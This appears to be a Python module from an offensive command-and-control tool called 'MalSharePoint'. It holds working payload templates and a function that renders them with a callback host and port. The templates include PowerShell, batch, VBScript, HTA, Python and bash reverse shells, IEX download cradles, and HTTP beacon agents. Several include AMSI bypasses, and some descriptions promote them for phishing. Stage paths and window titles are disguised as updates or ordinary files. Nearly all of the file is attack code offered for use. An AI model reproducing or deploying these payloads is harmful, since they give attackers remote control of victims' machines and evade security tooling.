"""
Pre-built staged payload templates inspired by Metasploit / modern C2 frameworks.

Each template provides:
  - id, name, description, platform, payload_type
  - A content template using Python str.format() placeholders
  - Default stage_path and required parameters

Placeholders:
  {LHOST}       - Listener host / callback IP
  {LPORT}       - Listener port
  {CALLBACK_URL} - Full callback URL (http(s)://LHOST:LPORT)
  {STAGE_URL}   - Full URL to the staged payload
  {SLEEP}       - Beacon sleep interval in seconds
  {JITTER}      - Jitter percentage (0-100)
  {UA}          - User-Agent string
"""

TEMPLATES: list[dict] = [
    # ── PowerShell ─────────────────────────────────────────────────────
    {
        "id": "ps_reverse_tcp",
        "name": "PowerShell Reverse Shell (TCP)",
        "description": "AMSI-bypassed PowerShell reverse shell over raw TCP. Connects back and streams cmd.exe I/O.",
        "platform": "windows",
        "payload_type": "ps1",
        "default_stage_path": "/update.ps1",
        "params": ["LHOST", "LPORT"],
        "content": r"""# --- MalSharePoint PS Reverse TCP ---
# AMSI bypass (runtime patching)
$a=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils')
$f=$a.GetField('a'+'msiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)

# ETW bypass
[Reflection.Assembly]::LoadWithPartialName('System.Core')|Out-Null
$etw=[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance')

$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT})
$stream = $client.GetStream()
[byte[]]$buf = 0..65535|%{{0}}
$enc = [System.Text.Encoding]::UTF8
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

$writer.Write("PS "+$env:COMPUTERNAME+"\"+$env:USERNAME+"> ")
while(($i = $stream.Read($buf, 0, $buf.Length)) -ne 0){{
    $cmd = $enc.GetString($buf,0,$i).TrimEnd()
    if($cmd -eq "exit"){{ break }}
    try {{
        $out = (Invoke-Expression $cmd 2>&1 | Out-String)
    }} catch {{
        $out = $_.Exception.Message + "`n"
    }}
    $writer.Write($out + "PS "+$env:COMPUTERNAME+"\"+$env:USERNAME+"> ")
}}
$client.Close()
""",
    },
    {
        "id": "ps_download_cradle",
        "name": "PowerShell Download Cradle (IEX)",
        "description": "One-liner download cradle. Fetches and executes a remote PS1 payload from the listener. Great as initial access vector.",
        "platform": "windows",
        "payload_type": "ps1",
        "default_stage_path": "/news.ps1",
        "params": ["LHOST", "LPORT", "STAGE_PATH"],
        "content": r"""# --- MalSharePoint Download Cradle ---
$u='{CALLBACK_URL}{STAGE_PATH}'
# AMSI bypass
try{{[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils').GetField('a'+'msiInitFailed','NonPublic,Static').SetValue($null,$true)}}catch{{}}
# Fetch & execute
$wc=New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent','{UA}')
IEX($wc.DownloadString($u))
""",
    },
    {
        "id": "ps_beacon_http",
        "name": "PowerShell HTTP Beacon Agent",
        "description": "Persistent HTTP beacon agent. Registers via C2 checkin, polls for tasks, executes and returns results. Full C2 integration.",
        "platform": "windows",
        "payload_type": "ps1",
        "default_stage_path": "/jquery.min.js",
        "params": ["LHOST", "LPORT", "SLEEP", "JITTER"],
        "content": r"""# --- MalSharePoint HTTP Beacon Agent (PS) ---
# AMSI + ETW bypass
try{{[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils').GetField('a'+'msiInitFailed','NonPublic,Static').SetValue($null,$true)}}catch{{}}
$ErrorActionPreference='SilentlyContinue'

$C2='{CALLBACK_URL}/api/c2'
$Sleep={SLEEP}
$Jitter={JITTER}
$UA='{UA}'

function C2-Request($path,$body){{
    $wc=New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent',$UA)
    $wc.Headers.Add('Content-Type','application/json')
    try{{
        if($body){{ return $wc.UploadString("$C2$path",$body) }}
        else{{ return $wc.DownloadString("$C2$path") }}
    }}catch{{ return $null }}
}}

# Checkin
$info = @{{
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os       = [System.Environment]::OSVersion.VersionString
    ip       = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{ $_.InterfaceAlias -notmatch 'Loopback' }} | Select-Object -First 1).IPAddress
    pid      = $PID
    arch     = if([Environment]::Is64BitProcess){{"x64"}}else{{"x86"}}
    domain   = $env:USERDOMAIN
    privileges = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}} | ConvertTo-Json -Compress

$reg = C2-Request '/checkin' $info | ConvertFrom-Json
if(-not $reg -or -not $reg.agent_id){{ exit }}
$AgentId = $reg.agent_id

# Beacon loop
while($true){{
    $jitterMs = Get-Random -Min 0 -Max ([int]($Sleep * ($Jitter/100.0) * 1000))
    Start-Sleep -Milliseconds ($Sleep * 1000 + $jitterMs)

    $beacon = C2-Request '/beacon' (@{{ agent_id=$AgentId }} | ConvertTo-Json -Compress) | ConvertFrom-Json
    if(-not $beacon -or -not $beacon.tasks){{ continue }}

    foreach($task in $beacon.tasks){{
        $output = ""
        $success = $true
        try {{
            switch($task.task_type){{
                'shell' {{
                    $output = (Invoke-Expression $task.command 2>&1 | Out-String)
                }}
                'sleep' {{
                    $parts = $task.command -split '\s+'
                    $Sleep = [int]$parts[0]
                    if($parts.Length -gt 1){{ $Jitter=[int]$parts[1] }}
                    $output = "Sleep=$Sleep Jitter=$Jitter"
                }}
                'exit' {{
                    C2-Request '/result' (@{{ agent_id=$AgentId; task_id=$task.id; output="Exiting"; success=$true }} | ConvertTo-Json -Compress) | Out-Null
                    exit
                }}
                default {{
                    $output = (Invoke-Expression $task.command 2>&1 | Out-String)
                }}
            }}
        }} catch {{
            $output = $_.Exception.Message
            $success = $false
        }}
        C2-Request '/result' (@{{ agent_id=$AgentId; task_id=$task.id; output=$output; success=$success }} | ConvertTo-Json -Compress) | Out-Null
    }}
}}
""",
    },

    # ── Batch / CMD ────────────────────────────────────────────────────
    {
        "id": "bat_reverse_tcp",
        "name": "Batch Reverse Shell (PowerShell-backed)",
        "description": "Batch file that spawns a hidden PowerShell reverse shell. Double-click friendly for phishing.",
        "platform": "windows",
        "payload_type": "bat",
        "default_stage_path": "/update.bat",
        "params": ["LHOST", "LPORT"],
        "content": r"""@echo off
:: --- MalSharePoint Batch Reverse Shell ---
:: Spawns a hidden PowerShell reverse TCP connection
title Windows Update Service
powershell.exe -nop -w hidden -ep bypass -c "$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%%{{0}};$w=New-Object System.IO.StreamWriter($s);$w.AutoFlush=$true;$w.Write('PS '+$env:COMPUTERNAME+'\'+$env:USERNAME+'> ');while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object System.Text.UTF8Encoding).GetString($b,0,$i).TrimEnd();if($d-eq'exit'){{break}};try{{$o=(iex $d 2>&1|Out-String)}}catch{{$o=$_.Exception.Message+'`n'}};$w.Write($o+'PS '+$env:COMPUTERNAME+'\'+$env:USERNAME+'> ')}};$c.Close()"
""",
    },
    {
        "id": "bat_beacon_agent",
        "name": "Batch HTTP Beacon Agent",
        "description": "CMD-native HTTP beacon using curl/powershell. Registers with C2, polls for tasks, executes. Minimal footprint.",
        "platform": "windows",
        "payload_type": "bat",
        "default_stage_path": "/agent.bat",
        "params": ["LHOST", "LPORT", "SLEEP"],
        "content": r"""@echo off
:: --- MalSharePoint Batch Beacon Agent ---
title Windows Service Host
setlocal EnableDelayedExpansion
set C2={CALLBACK_URL}/api/c2
set SLEEP={SLEEP}

:: Checkin via PowerShell (curl may not exist on older systems)
for /f "delims=" %%a in ('powershell -nop -c "$r=Invoke-RestMethod -Uri '%C2%/checkin' -Method POST -ContentType 'application/json' -Body ((@{{hostname=$env:COMPUTERNAME;username=$env:USERNAME;os=[Environment]::OSVersion.VersionString;ip=(Get-NetIPAddress -AddressFamily IPv4|?{{$_.InterfaceAlias-notmatch'Loopback'}}|Select -First 1).IPAddress}})|ConvertTo-Json -Compress);$r.agent_id"') do set AGENTID=%%a

if "%AGENTID%"=="" exit /b 1

:beacon
timeout /t %SLEEP% /nobreak >nul
for /f "delims=" %%t in ('powershell -nop -c "$r=Invoke-RestMethod -Uri '%C2%/beacon' -Method POST -ContentType 'application/json' -Body ((@{{agent_id='%AGENTID%'}})|ConvertTo-Json);if($r.tasks){{$r.tasks|%%{{$_.id+';'+$_.command}}}}else{{'none'}}"') do (
    if "%%t"=="none" goto beacon
    for /f "tokens=1,* delims=;" %%i in ("%%t") do (
        set TID=%%i
        set CMD=%%j
        for /f "delims=" %%r in ('!CMD! 2^>^&1') do set "OUT=!OUT!%%r\n"
        powershell -nop -c "Invoke-RestMethod -Uri '%C2%/result' -Method POST -ContentType 'application/json' -Body ((@{{agent_id='%AGENTID%';task_id='!TID!';output='!OUT!';success=$true}})|ConvertTo-Json)" >nul 2>&1
        set OUT=
    )
)
goto beacon
""",
    },

    # ── VBScript ───────────────────────────────────────────────────────
    {
        "id": "vbs_beacon_agent",
        "name": "VBScript HTTP Beacon Agent",
        "description": "WScript-based beacon agent. Low detection footprint, runs natively on Windows without PowerShell.",
        "platform": "windows",
        "payload_type": "vbs",
        "default_stage_path": "/update.vbs",
        "params": ["LHOST", "LPORT", "SLEEP"],
        "content": (
            "' --- MalSharePoint VBS Beacon Agent ---\n"
            "Dim C2Url, AgentId, SleepMs, DQ\n"
            "C2Url = \"{CALLBACK_URL}/api/c2\"\n"
            "SleepMs = {SLEEP} * 1000\n"
            "DQ = Chr(34)\n"
            "\n"
            "Function HttpPost(url, body)\n"
            "    Dim http\n"
            "    Set http = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")\n"
            "    http.Open \"POST\", url, False\n"
            "    http.setRequestHeader \"Content-Type\", \"application/json\"\n"
            "    http.setRequestHeader \"User-Agent\", \"{UA}\"\n"
            "    On Error Resume Next\n"
            "    http.Send body\n"
            "    If Err.Number = 0 Then HttpPost = http.responseText Else HttpPost = \"\"\n"
            "    On Error GoTo 0\n"
            "    Set http = Nothing\n"
            "End Function\n"
            "\n"
            "Function JsonVal(json, key)\n"
            "    Dim re, m\n"
            "    Set re = New RegExp\n"
            "    re.Pattern = DQ & key & DQ & \"\\s*:\\s*\" & DQ & \"([^\" & DQ & \"]+)\" & DQ\n"
            "    Set m = re.Execute(json)\n"
            "    If m.Count > 0 Then JsonVal = m(0).SubMatches(0) Else JsonVal = \"\"\n"
            "End Function\n"
            "\n"
            "' Gather system info\n"
            "Dim sh, net, info\n"
            "Set sh = CreateObject(\"WScript.Shell\")\n"
            "Set net = CreateObject(\"WScript.Network\")\n"
            "info = \"{{\" & DQ & \"hostname\" & DQ & \":\" & DQ & net.ComputerName & DQ & \",\" & DQ & \"username\" & DQ & \":\" & DQ & net.UserName & DQ & \",\" & DQ & \"os\" & DQ & \":\" & DQ & \"Windows\" & DQ & \"}}\"\n"
            "\n"
            "' Checkin\n"
            "Dim regResp\n"
            "regResp = HttpPost(C2Url & \"/checkin\", info)\n"
            "AgentId = JsonVal(regResp, \"agent_id\")\n"
            "If AgentId = \"\" Then WScript.Quit\n"
            "\n"
            "' Beacon loop\n"
            "Do While True\n"
            "    WScript.Sleep SleepMs\n"
            "    Dim beaconResp\n"
            "    beaconResp = HttpPost(C2Url & \"/beacon\", \"{{\" & DQ & \"agent_id\" & DQ & \":\" & DQ & AgentId & DQ & \"}}\")\n"
            "    If InStr(beaconResp, \"task_id\") = 0 Then GoTo NextLoop\n"
            "\n"
            "    Dim taskId, command\n"
            "    taskId = JsonVal(beaconResp, \"task_id\")\n"
            "    command = JsonVal(beaconResp, \"command\")\n"
            "    If taskId = \"\" Or command = \"\" Then GoTo NextLoop\n"
            "\n"
            "    Dim exec, output\n"
            "    On Error Resume Next\n"
            "    Set exec = sh.Exec(\"cmd.exe /c \" & command)\n"
            "    output = exec.StdOut.ReadAll & exec.StdErr.ReadAll\n"
            "    On Error GoTo 0\n"
            "\n"
            "    output = Replace(output, \"\\\", \"\\\\\")\n"
            "    output = Replace(output, DQ, \"\\\" & DQ)\n"
            "    output = Replace(output, vbCrLf, \"\\n\")\n"
            "    output = Replace(output, vbCr, \"\\n\")\n"
            "    output = Replace(output, vbLf, \"\\n\")\n"
            "\n"
            "    HttpPost C2Url & \"/result\", \"{{\" & DQ & \"agent_id\" & DQ & \":\" & DQ & AgentId & DQ & \",\" & DQ & \"task_id\" & DQ & \":\" & DQ & taskId & DQ & \",\" & DQ & \"output\" & DQ & \":\" & DQ & Left(output, 4000) & DQ & \",\" & DQ & \"success\" & DQ & \":true}}\"\n"
            "NextLoop:\n"
            "Loop\n"
        ),
    },

    # ── HTA (HTML Application) ────────────────────────────────────────
    {
        "id": "hta_dropper",
        "name": "HTA Dropper (PowerShell Stager)",
        "description": "HTML Application that executes a PowerShell download cradle. Opens via mshta.exe, ideal for phishing links / email attachments.",
        "platform": "windows",
        "payload_type": "hta",
        "default_stage_path": "/index.hta",
        "params": ["LHOST", "LPORT", "STAGE_PATH"],
        "content": (
            "<html>\n"
            "<head><title>Loading...</title>\n"
            "<HTA:APPLICATION ID=\"app\" WINDOWSTATE=\"minimize\" SHOWINTASKBAR=\"no\" SYSMENU=\"no\" />\n"
            "</head>\n"
            "<body>\n"
            "<script language=\"VBScript\">\n"
            "    Dim sh\n"
            "    Set sh = CreateObject(\"WScript.Shell\")\n"
            "    sh.Run \"powershell.exe -nop -w hidden -ep bypass -c \" & Chr(34) & \"try{{[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils').GetField('a'+'msiInitFailed','NonPublic,Static').SetValue($null,$true)}}catch{{}};IEX((New-Object System.Net.WebClient).DownloadString('{CALLBACK_URL}{STAGE_PATH}'))\" & Chr(34), 0, False\n"
            "    self.Close\n"
            "</script>\n"
            "</body>\n"
            "</html>\n"
        ),
    },

    # ── Python ─────────────────────────────────────────────────────────
    {
        "id": "py_reverse_tcp",
        "name": "Python Reverse Shell (TCP)",
        "description": "Cross-platform Python reverse shell. Works on Linux, macOS, and Windows with Python installed.",
        "platform": "cross-platform",
        "payload_type": "py",
        "default_stage_path": "/setup.py",
        "params": ["LHOST", "LPORT"],
        "content": r"""#!/usr/bin/env python3
# --- MalSharePoint Python Reverse TCP ---
import socket, subprocess, os, sys, platform

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('{LHOST}', {LPORT}))

    shell = '/bin/bash' if os.name != 'nt' else 'cmd.exe'
    info = f"{{platform.node()}}|{{os.getlogin()}}|{{platform.platform()}}"
    s.send(info.encode() + b'\n')

    while True:
        s.send(b'$ ' if os.name != 'nt' else b'> ')
        data = b''
        while not data.endswith(b'\n'):
            chunk = s.recv(1024)
            if not chunk:
                s.close()
                return
            data += chunk
        cmd = data.decode().strip()
        if cmd == 'exit':
            break
        if cmd.startswith('cd '):
            try:
                os.chdir(cmd[3:].strip())
                s.send(b'OK\n')
            except Exception as e:
                s.send(str(e).encode() + b'\n')
            continue
        try:
            out = subprocess.run(
                cmd, shell=True, capture_output=True, timeout=30
            )
            result = out.stdout + out.stderr
            s.send(result if result else b'(no output)\n')
        except subprocess.TimeoutExpired:
            s.send(b'[timeout]\n')
        except Exception as e:
            s.send(str(e).encode() + b'\n')
    s.close()

if __name__ == '__main__':
    main()
""",
    },
    {
        "id": "py_beacon_http",
        "name": "Python HTTP Beacon Agent",
        "description": "Cross-platform Python HTTP beacon agent with full C2 integration. Checkin, task polling, and result reporting.",
        "platform": "cross-platform",
        "payload_type": "py",
        "default_stage_path": "/requirements.txt",
        "params": ["LHOST", "LPORT", "SLEEP", "JITTER"],
        "content": r"""#!/usr/bin/env python3
# --- MalSharePoint Python HTTP Beacon ---
import json, os, platform, random, socket, subprocess, sys, time, urllib.request

C2 = '{CALLBACK_URL}/api/c2'
SLEEP = {SLEEP}
JITTER = {JITTER}
UA = '{UA}'

def c2_post(path, data):
    try:
        req = urllib.request.Request(
            C2 + path,
            data=json.dumps(data).encode(),
            headers={{'Content-Type': 'application/json', 'User-Agent': UA}},
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            return json.loads(resp.read())
    except Exception:
        return None

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return '127.0.0.1'

# Checkin
reg = c2_post('/checkin', {{
    'hostname': platform.node(),
    'username': os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'unknown'),
    'os': platform.platform(),
    'ip': get_ip(),
    'pid': os.getpid(),
    'arch': platform.machine(),
}})
if not reg or 'agent_id' not in reg:
    sys.exit(1)

agent_id = reg['agent_id']

# Beacon loop
while True:
    jitter_secs = random.uniform(0, SLEEP * JITTER / 100.0)
    time.sleep(SLEEP + jitter_secs)

    beacon = c2_post('/beacon', {{'agent_id': agent_id}})
    if not beacon or not beacon.get('tasks'):
        continue

    for task in beacon['tasks']:
        output, success = '', True
        try:
            cmd = task.get('command', '')
            ttype = task.get('task_type', 'shell')

            if ttype == 'exit':
                c2_post('/result', {{'agent_id': agent_id, 'task_id': task['id'], 'output': 'Exiting', 'success': True}})
                sys.exit(0)
            elif ttype == 'sleep':
                parts = cmd.split()
                SLEEP = int(parts[0])
                if len(parts) > 1:
                    JITTER = int(parts[1])
                output = f'Sleep={{SLEEP}} Jitter={{JITTER}}'
            elif cmd.startswith('cd '):
                os.chdir(cmd[3:].strip())
                output = os.getcwd()
            else:
                r = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
                output = (r.stdout + r.stderr).decode(errors='replace')
        except Exception as e:
            output = str(e)
            success = False

        c2_post('/result', {{
            'agent_id': agent_id,
            'task_id': task['id'],
            'output': output[:8000],
            'success': success,
        }})
""",
    },

    # ── Bash / Linux ───────────────────────────────────────────────────
    {
        "id": "sh_reverse_tcp",
        "name": "Bash Reverse Shell (TCP)",
        "description": "Classic bash reverse shell using /dev/tcp. Works on most Linux distributions.",
        "platform": "linux",
        "payload_type": "sh",
        "default_stage_path": "/install.sh",
        "params": ["LHOST", "LPORT"],
        "content": r"""#!/bin/bash
# --- MalSharePoint Bash Reverse TCP ---
bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1
""",
    },
    {
        "id": "sh_beacon_http",
        "name": "Bash HTTP Beacon Agent",
        "description": "POSIX shell HTTP beacon using curl. Lightweight persistent agent for Linux targets.",
        "platform": "linux",
        "payload_type": "sh",
        "default_stage_path": "/setup.sh",
        "params": ["LHOST", "LPORT", "SLEEP"],
        "content": r"""#!/bin/bash
# --- MalSharePoint Bash HTTP Beacon ---
C2="{CALLBACK_URL}/api/c2"
SLEEP={SLEEP}
UA="{UA}"

checkin() {{
    local ip
    ip=$(hostname -I 2>/dev/null | awk '{{print $1}}')
    local body
    body=$(printf '{{"hostname":"%s","username":"%s","os":"%s","ip":"%s","pid":%d}}' \
        "$(hostname)" "$(whoami)" "$(uname -a)" "$ip" "$$")
    curl -sf -A "$UA" -H 'Content-Type: application/json' -d "$body" "$C2/checkin"
}}

beacon() {{
    curl -sf -A "$UA" -H 'Content-Type: application/json' \
        -d "{{"\"agent_id\"":\"$AGENT_ID\"}}" "$C2/beacon"
}}

send_result() {{
    local tid="$1" out="$2" ok="$3"
    out=$(echo "$out" | head -c 8000 | sed 's/"/\\"/g' | tr '\n' ' ')
    curl -sf -A "$UA" -H 'Content-Type: application/json' \
        -d "{{"\"agent_id\"":\"$AGENT_ID\",\"task_id\":\"$tid\",\"output\":\"$out\",\"success\":$ok}}" \
        "$C2/result" >/dev/null 2>&1
}}

REG=$(checkin)
AGENT_ID=$(echo "$REG" | grep -oP '"agent_id"\s*:\s*"\K[^"]+')
[ -z "$AGENT_ID" ] && exit 1

while true; do
    sleep "$SLEEP"
    RESP=$(beacon)
    [ -z "$RESP" ] && continue

    # Extract first task (simple JSON parsing)
    TID=$(echo "$RESP" | grep -oP '"task_id"\s*:\s*"\K[^"]+' | head -1)
    CMD=$(echo "$RESP" | grep -oP '"command"\s*:\s*"\K[^"]+' | head -1)
    [ -z "$TID" ] && continue

    OUT=$(eval "$CMD" 2>&1)
    send_result "$TID" "$OUT" "true"
done
""",
    },
]

# Quick access map
TEMPLATE_MAP: dict[str, dict] = {t['id']: t for t in TEMPLATES}


def list_templates() -> list[dict]:
    """Return templates metadata (without content) for listing."""
    return [
        {k: v for k, v in t.items() if k != 'content'}
        for t in TEMPLATES
    ]


def get_template(template_id: str) -> dict | None:
    return TEMPLATE_MAP.get(template_id)


def render_template(template_id: str, params: dict) -> dict | None:
    """
    Render a payload template with the given parameters.

    Required params vary by template. Common: LHOST, LPORT.
    Auto-populated: CALLBACK_URL (from LHOST+LPORT), UA, SLEEP, JITTER.
    """
    tpl = TEMPLATE_MAP.get(template_id)
    if not tpl:
        return None

    lhost = str(params.get('LHOST', '127.0.0.1'))
    lport = str(params.get('LPORT', '80'))
    scheme = params.get('SCHEME', 'http')
    callback_url = f"{scheme}://{lhost}:{lport}"

    render_params = {
        'LHOST': lhost,
        'LPORT': lport,
        'CALLBACK_URL': callback_url,
        'STAGE_URL': callback_url + tpl['default_stage_path'],
        'STAGE_PATH': str(params.get('STAGE_PATH', tpl['default_stage_path'])),
        'SLEEP': str(params.get('SLEEP', '5')),
        'JITTER': str(params.get('JITTER', '10')),
        'UA': str(params.get('UA', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36')),
    }

    content = tpl['content'].format(**render_params)

    return {
        'template_id': template_id,
        'name': tpl['name'],
        'payload_type': tpl['payload_type'],
        'platform': tpl['platform'],
        'default_stage_path': tpl['default_stage_path'],
        'content': content,
        'params_used': render_params,
    }
